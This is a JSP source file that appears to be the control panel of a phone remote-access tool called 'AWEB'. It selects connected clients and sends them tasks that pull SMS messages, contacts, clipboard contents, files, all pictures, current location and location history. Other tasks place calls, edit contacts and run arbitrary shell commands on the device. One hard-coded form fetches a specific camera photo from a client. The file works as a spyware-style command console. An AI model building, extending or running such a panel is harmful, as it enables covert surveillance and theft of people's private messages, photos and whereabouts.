<%@page import="java.util.List"%>
<%@page import="net.shenru.aweb.client.Client"%>
<%@page import="net.shenru.aweb.client.Client.Status"%>
<%@page import="net.shenru.aweb.client.ClientManager"%>
<%@page import="net.shenru.aweb.client.ClientService"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>

<script type="text/javascript">
	var taskArray;

	function selectTask() {
		//alert("selectTask");
		if (!taskArray) {
			taskArray = new Array();
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getClipboardData',taskContent:{}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'shellOpenBrowser',taskContent:{uri:'http://baidu.com'}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'setClipboardData',taskContent:{data:'深入AWEB'}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getContacts',taskContent:{}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'addContacts',taskContent:{'mobile':'18888888888','name':'shenru'}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'updataContacts',taskContent:{'mobile':'18888888888','name':'shenru'}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'deleteContacts',taskContent:{'id':119}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'callPhone',taskContent:{'telephone':13021266639}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getSmsbox',taskContent:{}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getFile',taskContent:{'path':'/sdcard/aweb/test.txt','port':'10000'}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getFolder',taskContent:{'path':'/sdcard/'}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getPictures',taskContent:{}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getLocation',taskContent:{}}");
			taskArray
					.push("{id:1,type:'AWEB',isResponse:true,method:'getLocus',taskContent:{}}");
			taskArray
					.push("{id:1,type:'CMD',isResponse:true,method:'shell',taskContent:{content:'#'}}");

		}
		var requestElement = document.getElementById("request");
		var element = document.getElementById("selectTask");
		var value = element.options[element.selectedIndex].value;
		for ( var i = 0; i < taskArray.length; i++) {
			var taskStr = taskArray[i];
			var matchResult = taskStr.match("method:'" + value + "'");
			if (matchResult != null) {
				//是否为shell
				if ("shell" == value) {
					var shellStr = prompt("请输入命令", "");
					if (shellStr != null && shellStr != "") {
						taskStr = taskStr.replace(/#/, shellStr);
					}
				}
				var id = Math.round(new Date().getTime() + Math.random()
						* 100000);
				taskStr = taskStr.replace(/id:1/, "id:" + id);
				requestElement.value = taskStr;
				return;
			}
		}
		requestElement.value = "";
	}

	function send() {
		if (!last_token) {
			alert("请选择客户端");
			return;
		}
		var requestElement = document.getElementById("request");
		var responseElement = document.getElementById("response");
		responseElement.value = "等待客户端响应";
		sendTask(requestElement.value, last_token);
		//requestElement.get
	}

	function sendTask(content, token) {
		//alert("token:" + token);
		if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
			xmlhttp = new XMLHttpRequest();
		} else {// code for IE6, IE5
			xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange = function() {
			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
				//alert(xmlhttp.responseText);
				var requestElement = document.getElementById("response");
				requestElement.value = xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST", "sendTask", true);
		xmlhttp.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		xmlhttp.setRequestHeader("token", token);
		//xmlhttp.send("task=" + content + " &token=" + token);
		xmlhttp.send("task=" + content);
	}

	var last_li;
	var last_token;
	function selectClient(docname, token) {
		//alert(token);
		//这里标签使用name 有的使用 id
		var li = document.getElementById(docname);
		if (last_li) {
			last_li.style.backgroundColor = "#ffffff";
			if (li == last_li) {
				last_li = null;
				last_token = null;
				return;
			}
		}
		li.style.backgroundColor = "#FFCC80";
		last_li = li;
		last_token = token;
	}

	function openClient(docname, token) {
		window.location = 'enyo/main.jsp?token=' + token;
	}

	function refresh() {
		request();
	}

	function request() {
		var xmlhttp;
		if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
			xmlhttp = new XMLHttpRequest();
		} else {// code for IE6, IE5
			xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange = function() {
			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
				//alert(xmlhttp.responseText);
				console.log(xmlhttp.responseText);
			}
		}
		xmlhttp.open("POST", "getClientList", true);
		xmlhttp.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		xmlhttp.send("name=Bill&password=Gates");
	}
</script>

</head>

<%
	if (!ClientService.getInstance().isRuning()) {
		ClientService.getInstance().start();
	}
%>

<body style="margin: 20px" onload="refresh()">
	<div style="width: 30%; border-style: solid; border-width: 1px;">
		<table style="width: 100%;">
			<tr>
				<td>
					<div style="border: 1px solid #000000; padding: 10px;">
						<div>
							服务器状态&nbsp:&nbsp<%=ClientService.getInstance().isRuning() ? "以启动" : "未启动 "%></div>
						服务器地址&nbsp:&nbsp<%=request.getLocalAddr()%>
					</div></td>
			</tr>
			<tr>
				<td>
					<form action="sendTask">
						<input name="token" type="hidden"
							value="ME525+1392910937787|123456" /> <input name="task"
							type="hidden"
							value="{id:1,type:'AWEB',isResponse:true,method:'getFile',taskContent:{'path':'/mnt/sdcard/DCIM/Camera/IMG_20121108_173641.jpg'}}" />
						<input type="submit" />

					</form></td>
			</tr>
			<tr>
				<td><p>客户列表：</p>
					<ol style="cursor: pointer">
						<%
							List<Client> clients = ClientManager.getInstance().getClientsByStatue(Status.WAITING);
							for (int i = 0; i < clients.size(); i++) {
								Client c = clients.get(i);
						%>
						<li id="li_<%=i%>"
							ondblclick="openClient('li_<%=i%>' , '<%=c.getToken()%>')"
							onclick="selectClient('li_<%=i%>' , '<%=c.getToken()%>')"><%=c.getName()%></li>
						<%
							}
						%>
					</ol></td>
			</tr>
		</table>
	</div>
	<div
		style="float: none; position: absolute; left: 35%; top: 20px; border-style: solid; border-width: 1px;">
		<table>
			<tr>

			</tr>
			<tr>
				<td><textarea id="request" rows="15" cols="80">发送内容</textarea>
				</td>
			</tr>
			<tr>
				<td><select id="selectTask" onchange="selectTask()">
						<option selected="selected" value="">选择功能</option>
						<option value="shellOpenBrowser">打开浏览器</option>
						<option value="getClipboardData">获取剪切板</option>
						<option value="setClipboardData">设置剪切板</option>
						<option value="getContacts">获取通讯录</option>
						<option value="addContacts">添加通讯录</option>
						<option value="deleteContacts">删除通讯录</option>
						<option value="updataContacts">更新通讯录</option>
						<option value="getSmsbox">获取短信</option>
						<option value="getFile">下载文件</option>
						<option value="getFolder">获取目录</option>
						<option value="getPictures">获取所有图片</option>
						<option value="callPhone">拨打电话</option>
						<option value="getLocation">获取当前位置</option>
						<option value="getLocus">获取轨迹</option>
						<option value="shell">Shell</option>
						
				</select> <input type="button" value="submit" onclick="send()" />
				</td>
			</tr>
			<tr>
				<td><textarea id="response" rows="15" cols="80">获取到的内容</textarea>
				</td>
			</tr>
		</table>


	</div>
</body>
</html>
